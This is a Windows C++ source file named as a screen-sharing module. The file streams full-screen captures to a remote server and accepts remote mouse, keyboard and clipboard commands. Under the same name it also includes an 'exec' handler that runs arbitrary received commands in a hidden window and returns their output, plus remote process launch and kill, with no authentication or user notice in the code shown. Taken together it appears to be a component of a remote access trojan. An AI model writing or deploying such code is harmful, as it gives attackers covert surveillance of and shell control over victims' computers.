// screen_share.cpp
#define UNICODE
#define _UNICODE

#define _WIN32_WINNT 0x0A00  // Windows 10
#include <windows.h>

#include <winsock2.h>
#include <gdiplus.h>
#include <wincodec.h>
#include <shlwapi.h>


#include "screen_share.h"   // adjust path if needed (declares handle_screen_share)
#include "utils.h"
#include "json.hpp"

    // WIC
#include <shellapi.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>
#include <iostream>
#include <sstream>
#include <algorithm>



#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")

using json = nlohmann::json;



// ---------- globals ----------
static std::atomic<bool> g_sharing_active(false);
static std::thread g_sharing_thread;
static std::mutex g_wic_mtx;
static IWICImagingFactory* g_wicFactory = nullptr;

static int g_fps = 25;
static int g_jpeg_quality = 70;

// GUI (remote) dimensions used for scaling coordinates
static std::atomic<int> g_gui_width(1920);
static std::atomic<int> g_gui_height(1080);

// Real local screen dimensions
static int g_real_width = 0;
static int g_real_height = 0;

// Drag state
static std::atomic<bool> g_dragging(false);

// ------------------ Helper: WIC factory ------------------




static bool ensure_wic_factory() {
    if (!g_wicFactory) {
        HRESULT hr = CoCreateInstance(
            CLSID_WICImagingFactory, nullptr, CLSCTX_INPROC_SERVER,
            IID_PPV_ARGS(&g_wicFactory)
        );
        if (FAILED(hr)) return false;
    }
    return true;
}




// ------------------ Helper: Encode HBITMAP -> JPEG bytes via WIC ------------------

#include <comdef.h> // for _com_error and _bstr_t

bool encode_hbitmap_to_jpeg_bytes(HBITMAP hBitmap, std::vector<BYTE>& outBytes, int quality) {
    if (!ensure_wic_factory()) {
        printf("[encode_hbitmap] ❌ WIC factory not initialized\n");
        return false;
    }

    HRESULT hr = S_OK;
    IWICBitmap* wicBitmap = nullptr;
    IStream* stream = nullptr;
    IWICBitmapEncoder* encoder = nullptr;
    IWICBitmapFrameEncode* frame = nullptr;
    IPropertyBag2* bag = nullptr;
    IWICFormatConverter* converter = nullptr;

    UINT w = 0, h = 0;
    UINT stride = 0, bufferSize = 0;
    std::vector<BYTE> pixels;
    WICPixelFormatGUID srcFmt = GUID_WICPixelFormatDontCare;
    WICPixelFormatGUID dstFmt = GUID_WICPixelFormat24bppBGR;

    bool success = false;

#define CHECK_HR(step) if (FAILED(hr)) { \
    _com_error err(hr); \
    printf("[encode_hbitmap] ❌ Failed at %s (HRESULT=0x%lx: %ws)\n", step, hr, err.ErrorMessage()); \
    goto cleanup; \
}

    // --- Create WIC Bitmap from HBITMAP
    hr = g_wicFactory->CreateBitmapFromHBITMAP(hBitmap, NULL, WICBitmapIgnoreAlpha, &wicBitmap);
    CHECK_HR("CreateBitmapFromHBITMAP");

    stream = SHCreateMemStream(nullptr, 0);
    if (!stream) {
        printf("[encode_hbitmap] ❌ SHCreateMemStream failed\n");
        goto cleanup;
    }

    hr = g_wicFactory->CreateEncoder(GUID_ContainerFormatJpeg, nullptr, &encoder);
    CHECK_HR("CreateEncoder");

    hr = encoder->Initialize(stream, WICBitmapEncoderNoCache);
    CHECK_HR("encoder->Initialize");

    hr = encoder->CreateNewFrame(&frame, &bag);
    CHECK_HR("CreateNewFrame");

    // --- Set JPEG Quality
    {
        PROPBAG2 option = {};
        VARIANT varValue;
        VariantInit(&varValue);
        option.pstrName = const_cast<LPOLESTR>(L"ImageQuality");
        varValue.vt = VT_R4;
        varValue.fltVal = (float)quality / 100.0f;
        bag->Write(1, &option, &varValue);
        VariantClear(&varValue);
    }

    hr = frame->Initialize(bag);
    CHECK_HR("frame->Initialize");

    wicBitmap->GetSize(&w, &h);
    wicBitmap->GetPixelFormat(&srcFmt);

    // --- Create format converter
    hr = g_wicFactory->CreateFormatConverter(&converter);
    CHECK_HR("CreateFormatConverter");

    hr = converter->Initialize(
        wicBitmap,
        dstFmt,
        WICBitmapDitherTypeNone,
        nullptr,
        0.0,
        WICBitmapPaletteTypeCustom
    );
    CHECK_HR("converter->Initialize");

    frame->SetSize(w, h);
    frame->SetPixelFormat(&dstFmt);

    stride = ((w * 24 + 7) / 8);
    bufferSize = stride * h;
    pixels.resize(bufferSize);

    hr = converter->CopyPixels(nullptr, stride, bufferSize, pixels.data());
    CHECK_HR("CopyPixels");

    hr = frame->WritePixels(h, stride, bufferSize, pixels.data());
    CHECK_HR("WritePixels");

    hr = frame->Commit();
    CHECK_HR("frame->Commit");

    hr = encoder->Commit();
    CHECK_HR("encoder->Commit");

    // --- Extract JPEG data
    {
        STATSTG st = {};
        if (SUCCEEDED(stream->Stat(&st, STATFLAG_NONAME))) {
            ULONG size = (ULONG)st.cbSize.QuadPart;
            outBytes.resize(size);
            LARGE_INTEGER pos = {};
            stream->Seek(pos, STREAM_SEEK_SET, NULL);
            ULONG bytesRead = 0;
            stream->Read(outBytes.data(), size, &bytesRead);
            outBytes.resize(bytesRead);
            success = !outBytes.empty();
        }
    }

cleanup:
    if (bag) bag->Release();
    if (frame) frame->Release();
    if (encoder) encoder->Release();
    if (converter) converter->Release();
    if (stream) stream->Release();
    if (wicBitmap) wicBitmap->Release();

    return success;
}


// ------------------ Capture full screen into HBITMAP ------------------
static HBITMAP capture_fullscreen_hbitmap(int& outWidth, int& outHeight) {
    HDC hScreenDC = GetDC(nullptr);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemDC);
        ReleaseDC(nullptr, hScreenDC);
        return nullptr;
    }
    HGDIOBJ oldObj = SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0,
        SRCCOPY | CAPTUREBLT);
;


    SelectObject(hMemDC, oldObj);
    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreenDC);
    outWidth = width; outHeight = height;
    return hBitmap;
}

// ------------------ Coordinate scaling ------------------
static POINT gui_to_local(int gx, int gy) {
    POINT p = { gx, gy };
    int gw = g_gui_width.load();
    int gh = g_gui_height.load();
    if (gw <= 0 || gh <= 0) return p;
    p.x = (int)((double)gx * (double)g_real_width / (double)gw);
    p.y = (int)((double)gy * (double)g_real_height / (double)gh);
    return p;
}

// ------------------ Input simulation helpers ------------------
static void input_mouse_move_local(int x, int y) {
    
    INPUT input = {};
    input.type = INPUT_MOUSE;

    input.mi.dwFlags = MOUSEEVENTF_MOVE | 
                       MOUSEEVENTF_ABSOLUTE | 
                       MOUSEEVENTF_VIRTUALDESK;

    input.mi.dx = (x * 65535) / (GetSystemMetrics(SM_CXVIRTUALSCREEN) - 1);
    input.mi.dy = (y * 65535) / (GetSystemMetrics(SM_CYVIRTUALSCREEN) - 1);

    SendInput(1, &input, sizeof(INPUT));
}




static void input_mouse_click_local(const std::string& button, const std::string& state) {
    printf("CLICK RECEIVED: %s %s\n", button.c_str(), state.c_str());

    INPUT i = {};
    i.type = INPUT_MOUSE;

    if (button == "left")
        i.mi.dwFlags = (state == "down") ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
    else
        i.mi.dwFlags = (state == "down") ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;

    UINT sent = SendInput(1, &i, sizeof(i));
    printf("SendInput returned: %u\n", sent);
}


// double-click helper
static void input_mouse_double_click_local(const std::string& button) {
    input_mouse_click_local(button, "down");
    input_mouse_click_local(button, "up");
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    input_mouse_click_local(button, "down");
    input_mouse_click_local(button, "up");
}

// wheel (delta typically multiples of 120)
static void input_mouse_wheel_local(int delta) {
    INPUT i = {}; i.type = INPUT_MOUSE;
    i.mi.dwFlags = MOUSEEVENTF_WHEEL;
    i.mi.mouseData = (DWORD)delta;
    SendInput(1, &i, sizeof(i));
}

// key simulation using VK
static void input_key_local(WORD vk, bool down) {
    INPUT i = {}; i.type = INPUT_KEYBOARD;
    i.ki.wVk = vk;
    i.ki.wScan = (WORD)MapVirtualKey(vk, MAPVK_VK_TO_VSC);
    i.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
    SendInput(1, &i, sizeof(i));
}

// type Unicode string using SendInput KEYEVENTF_UNICODE
static void input_text_local(const std::wstring &text) {
    for (wchar_t ch : text) {
        INPUT in[2] = {};
        in[0].type = INPUT_KEYBOARD;
        in[0].ki.dwFlags = KEYEVENTF_UNICODE;
        in[0].ki.wScan = (WORD)ch;
        in[1].type = INPUT_KEYBOARD;
        in[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        in[1].ki.wScan = (WORD)ch;
        SendInput(2, in, sizeof(INPUT));
    }
}

// ------------------ Clipboard helpers ------------------
static void set_clipboard_text(const std::string &utf8text) {
    if (!OpenClipboard(NULL)) return;
    EmptyClipboard();
    int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8text.c_str(), -1, NULL, 0);
    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (wlen) * sizeof(wchar_t));
    if (!hGlob) { CloseClipboard(); return; }
    wchar_t* pw = (wchar_t*)GlobalLock(hGlob);
    MultiByteToWideChar(CP_UTF8, 0, utf8text.c_str(), -1, pw, wlen);
    GlobalUnlock(hGlob);
    SetClipboardData(CF_UNICODETEXT, hGlob);
    CloseClipboard();
}

static std::string get_clipboard_text_utf8() {
    if (!OpenClipboard(NULL)) return std::string();
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (!hData) { CloseClipboard(); return std::string(); }
    wchar_t* pw = (wchar_t*)GlobalLock(hData);
    if (!pw) { CloseClipboard(); return std::string(); }
    int len = WideCharToMultiByte(CP_UTF8, 0, pw, -1, NULL, 0, NULL, NULL);
    std::string out(len, '\0');
    WideCharToMultiByte(CP_UTF8, 0, pw, -1, &out[0], len, NULL, NULL);
    GlobalUnlock(hData);
    CloseClipboard();
    if (!out.empty() && out.back() == '\0') out.pop_back();
    return out;
}

// ------------------ Shell exec / command capture ------------------
static std::string exec_command_capture(const std::string &cmd) {
    // Create pipes and run cmd in hidden window, capture stdout+stderr
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hOutRead = NULL, hOutWrite = NULL;
    if (!CreatePipe(&hOutRead, &hOutWrite, &sa, 0)) return "pipe failed";

    PROCESS_INFORMATION pi = {};
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.hStdOutput = hOutWrite;
    si.hStdError = hOutWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Convert cmd to wide
    int wlen = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
    std::wstring wcmd(wlen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, &wcmd[0], wlen);

    // Create process hidden via CREATE_NO_WINDOW (or CREATE_NEW_CONSOLE)
    BOOL ok = CreateProcessW(NULL, &wcmd[0], NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hOutWrite);
    if (!ok) {
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread) CloseHandle(pi.hThread);
        CloseHandle(hOutRead);
        return "CreateProcess failed";
    }

    // Read output until process exits
    std::string output;
    CHAR buffer[4096];
    DWORD readBytes = 0;
    for (;;) {
        BOOL r = ReadFile(hOutRead, buffer, sizeof(buffer), &readBytes, NULL);
        if (r && readBytes > 0) {
            output.append(buffer, buffer + readBytes);
        } else {
            DWORD code = 0;
            if (WaitForSingleObject(pi.hProcess, 50) == WAIT_TIMEOUT) {
                // still running; continue reading
                if (GetLastError() != ERROR_BROKEN_PIPE) continue;
            } else break;
        }
        if (!r) break;
    }

    // Wait for exit and close handles
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hOutRead);
    return output;
}

// ------------------ Helper: open URL ------------------
static void open_url_default_browser(const std::string &url) {
    // Use ShellExecuteW
    int wlen = MultiByteToWideChar(CP_UTF8, 0, url.c_str(), -1, NULL, 0);
    std::wstring wurl(wlen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, url.c_str(), -1, &wurl[0], wlen);
    ShellExecuteW(NULL, L"open", wurl.c_str(), NULL, NULL, SW_SHOWNORMAL);
}

// ------------------ Main sharing loop ------------------
static void sharing_loop(sock_t sock, std::string client) {
    printf("[screen_share] sharing_loop started\n");
    const int interval_ms = (g_fps > 0) ? (1000 / g_fps) : 100;
    auto last_frame = std::chrono::steady_clock::now();

    while (g_sharing_active)
    {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - last_frame).count();

        if (elapsed >= interval_ms)
        {
            last_frame = now;

            int w = 0, h = 0;
            HBITMAP hBmp = capture_fullscreen_hbitmap(w, h);
            if (!hBmp) continue;

            std::vector<BYTE> jpeg;
            if (encode_hbitmap_to_jpeg_bytes(hBmp, jpeg, g_jpeg_quality))
            {
                json payload = {
                    {"cmd", "frame"},
                    {"client", client},
                    {"type", "binary_frame"},
                    {"size", jpeg.size()},
                    {"width", w},
                    {"height", h}
                };

                send_result_safe(sock, payload, client, jpeg);
            }

            DeleteObject(hBmp);
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }

}


// ------------------ Process incoming screen_input payload here ------------------
static void process_screen_input_payload(sock_t sock, const json &payload, const std::string &client) {
   
        std::string type = payload.value("type", "");
        if (type == "mouse_move") {
            int gx = payload.value("x", 0);
            int gy = payload.value("y", 0);
            // optionally accept client_width/client_height overrides per event
            int cw = payload.value("client_width", g_gui_width.load());
            int ch = payload.value("client_height", g_gui_height.load());
            if (cw > 0) g_gui_width = cw;
            if (ch > 0) g_gui_height = ch;
            POINT p = gui_to_local(gx, gy);
            input_mouse_move_local(p.x, p.y);
        }
        else if (type == "mouse_click") {
            int gx = payload.value("x", 0);
            int gy = payload.value("y", 0);
            std::string button = payload.value("button", "left");
            std::string state = payload.value("state", "down"); // down/up
            int cw = payload.value("client_width", g_gui_width.load());
            int ch = payload.value("client_height", g_gui_height.load());
            if (cw > 0) g_gui_width = cw;
            if (ch > 0) g_gui_height = ch;
            POINT p = gui_to_local(gx, gy);
            input_mouse_move_local(p.x, p.y);
            if (state == "double") input_mouse_double_click_local(button);
            else input_mouse_click_local(button, state);
        }
        else if (type == "mouse_scroll") {
            int delta = payload.value("delta", 120);
            input_mouse_wheel_local(delta);
        }
        else if (type == "drag") {
            std::string phase = payload.value("phase", "start"); // start/move/end
            int gx = payload.value("x", 0), gy = payload.value("y", 0);
            int cw = payload.value("client_width", g_gui_width.load());
            int ch = payload.value("client_height", g_gui_height.load());
            if (cw > 0) g_gui_width = cw;
            if (ch > 0) g_gui_height = ch;
            POINT p = gui_to_local(gx, gy);
            if (phase == "start") {
                g_dragging = true;
                input_mouse_move_local(p.x, p.y);
                input_mouse_click_local("left", "down");
            } else if (phase == "move") {
                if (g_dragging) input_mouse_move_local(p.x, p.y);
            } else if (phase == "end") {
                if (g_dragging) {
                    input_mouse_move_local(p.x, p.y);
                    input_mouse_click_local("left", "up");
                    g_dragging = false;
                }
            }
        }
        else if (type == "double_click") {
            int gx = payload.value("x", 0), gy = payload.value("y", 0);
            int cw = payload.value("client_width", g_gui_width.load());
            int ch = payload.value("client_height", g_gui_height.load());
            if (cw > 0) g_gui_width = cw;
            if (ch > 0) g_gui_height = ch;
            POINT p = gui_to_local(gx, gy);
            input_mouse_move_local(p.x, p.y);
            input_mouse_double_click_local("left");
        }
        else if (type == "key") {
            // Expect payload: { type: "key", vk: <int>, state: "down"/"up" }
            int vk = payload.value("vk", 0);
            std::string state = payload.value("state", "down");
            if (vk == 0) {
                // maybe GUI sent Qt key code or ascii; try 'key' field
                int key = payload.value("key", 0);
                if (key > 0) vk = (int)key;
            }
            bool down = (state != "up");
            if (vk > 0) input_key_local((WORD)vk, down);
        }
        else if (type == "text") {
            // type Unicode string on client
            std::string text = payload.value("text", "");
            if (!text.empty()) {
                int wlen = MultiByteToWideChar(CP_UTF8, 0, text.c_str(), -1, NULL, 0);
                std::wstring wtext(wlen, L'\0');
                MultiByteToWideChar(CP_UTF8, 0, text.c_str(), -1, &wtext[0], wlen);
                // remove trailing null in wtext
                if (!wtext.empty() && wtext.back() == L'\0') wtext.pop_back();
                input_text_local(wtext);
            }
        }
        else if (type == "clipboard_set") {
            std::string content = payload.value("text", "");
            set_clipboard_text(content);
        }
        else if (type == "clipboard_get") {
            std::string txt = get_clipboard_text_utf8();
            json resp = { {"cmd", "clipboard_result"}, {"text", txt} };
            send_result_safe(sock, resp, client, {});
        }
        else if (type == "exec") {
            std::string cmd = payload.value("cmd", "");
            std::string out = exec_command_capture(cmd);
            json resp = { {"cmd", "exec_result"}, {"output", out} };
            send_result_safe(sock, resp, client, {});
        }
        else if (type == "open_url") {
            std::string url = payload.value("url", "");
            if (!url.empty()) open_url_default_browser(url);
        }
        else if (type == "start_process") {
            std::string path = payload.value("path", "");
            std::string args = payload.value("args", "");
            // Basic: ShellExecute to launch
            if (!path.empty()) {
                std::string cmdline = path + " " + args;
                int wlen = MultiByteToWideChar(CP_UTF8, 0, cmdline.c_str(), -1, NULL, 0);
                std::wstring wcmd(wlen, L'\0');
                MultiByteToWideChar(CP_UTF8, 0, cmdline.c_str(), -1, &wcmd[0], wlen);
                STARTUPINFOW si = {}; PROCESS_INFORMATION pi = {};
                si.cb = sizeof(si);
                CreateProcessW(NULL, &wcmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                if (pi.hProcess) CloseHandle(pi.hProcess);
                if (pi.hThread) CloseHandle(pi.hThread);
            }
        }
        else if (type == "kill_process") {
            int pid = payload.value("pid", 0);
            if (pid > 0) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
                if (h) { TerminateProcess(h, 1); CloseHandle(h); }
            }
        }
        else {
            // Unknown type — ignore or log
        }
    
}

// ------------------ Public entrypoint (single unified command) ------------------
// call this from your main command dispatcher when command == "SCREEN_SHARE"
void handle_screen_share(sock_t sock, const json& payload, const std::string& client) {
    
    
        std::string subcmd = payload.value("cmd", "");
        if (subcmd == "start") {
            SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
            if (g_sharing_active.load()) return;

            // accept gui dimensions if provided (helps scaling)
            int gw = payload.value("gui_width", g_gui_width.load());
            int gh = payload.value("gui_height", g_gui_height.load());
            g_gui_width = (gw>0) ? gw : g_gui_width.load();
            g_gui_height = (gh>0) ? gh : g_gui_height.load();

            g_real_width = GetSystemMetrics(SM_CXSCREEN);
            g_real_height = GetSystemMetrics(SM_CYSCREEN);

            g_fps = payload.value("fps", g_fps);
            g_jpeg_quality = payload.value("quality", g_jpeg_quality);

            HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
            if (!SUCCEEDED(hr) && hr != RPC_E_CHANGED_MODE) {
                std::cerr << "[screen_share] CoInitializeEx failed\n";
            }
            ensure_wic_factory();

            // send screen_info handshake to server (GUI)
            json hs = { {"cmd", "start"}, {"width", g_real_width}, {"height", g_real_height} };
            
            send_result_safe(sock, hs, client, {});

            g_sharing_active = true;
            g_sharing_thread = std::thread([sock, client]() { sharing_loop(sock, client); });
            g_sharing_thread.detach();
        }
        else if (subcmd == "stop") {
            if (!g_sharing_active.load()) return;
            g_sharing_active = false;
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            std::lock_guard<std::mutex> lg(g_wic_mtx);
            if (g_wicFactory) { g_wicFactory->Release(); g_wicFactory = nullptr; }
            CoUninitialize();
        }
        else if (subcmd == "screen_input") {
            // handle input locally inside this file
            process_screen_input_payload(sock, payload, client);
        }
        else if (subcmd == "config") {
            // update runtime settings
            if (payload.contains("fps")) g_fps = payload.value("fps", g_fps);
            if (payload.contains("quality")) g_jpeg_quality = payload.value("quality", g_jpeg_quality);
            if (payload.contains("gui_width")) g_gui_width = payload.value("gui_width", g_gui_width.load());
            if (payload.contains("gui_height")) g_gui_height = payload.value("gui_height", g_gui_height.load());
        }
        else {
            // unknown subcmd
        }
    
}
